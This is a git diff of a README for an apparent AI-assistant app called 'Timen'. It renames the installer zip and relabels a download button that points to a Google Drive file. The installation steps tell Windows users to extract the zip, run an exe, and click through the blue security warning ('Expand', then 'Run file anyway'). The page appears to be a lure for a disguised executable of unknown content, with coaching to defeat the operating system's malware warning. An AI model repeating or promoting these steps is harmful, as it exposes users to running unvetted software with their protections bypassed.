@@ -16,16 +16,16 @@ Welcome to **Timen** – a revolutionary AI assistant that adapts to your unique
 ## Download & Installation
 
 <p align="center">
-  <a href="https://drive.usercontent.google.com/download?id=1g5ozLkN4HOvClZSucSS9AaKC0mcuMmAb&export=download&authuser=0&confirm=t&uuid=8b104717-1de0-4c28-b42e-38a0baf46d81&at=AIrpjvNQfaC2uaHjV23yYE5U7U8-:1739116713050" style="background-color: #007aff; color: #ffffff; padding: 15px 25px; font-size: 18px; text-decoration: none; border-radius: 8px;">Download TimenSetup.zip</a>
+  <a href="https://drive.usercontent.google.com/download?id=1g5ozLkN4HOvClZSucSS9AaKC0mcuMmAb&export=download&authuser=0&confirm=t&uuid=8b104717-1de0-4c28-b42e-38a0baf46d81&at=AIrpjvNQfaC2uaHjV23yYE5U7U8-:1739116713050" style="background-color: #007aff; color: #ffffff; padding: 15px 25px; font-size: 18px; text-decoration: none; border-radius: 8px;">Download the demo here</a>
 </p>
 
-To get started, simply click the download button above to retrieve the `TimenSetup.zip` file.
+To get started, simply click the download button above to retrieve the `SetupTimen.zip` file.
 
 **Installation Steps (Windows 11):**
 
-1. **Download:** Click the button above to download the `TimenSetup.zip` file.
+1. **Download:** Click the button above to download the `SetupTimen.zip` file.
 2. **Extract:** Right‑click the downloaded file and select **Extract All...** to unzip it into a folder of your choice.
-3. **Run Installer:** Open the extracted folder and double‑click on **TimenSetup.exe** to start the installation process.
+3. **Run Installer:** Open the extracted folder and double‑click on **SetupTimen.exe** to start the installation process.
    - **Security Prompt:** When you open the exe, a blue security window may pop up. In this window, click the underlined **Expand** text, and then choose **Run file anyway** if prompted.
 4. **Customize:** Follow the on‑screen instructions to personalize Timen and enjoy a smarter computing experience.
 
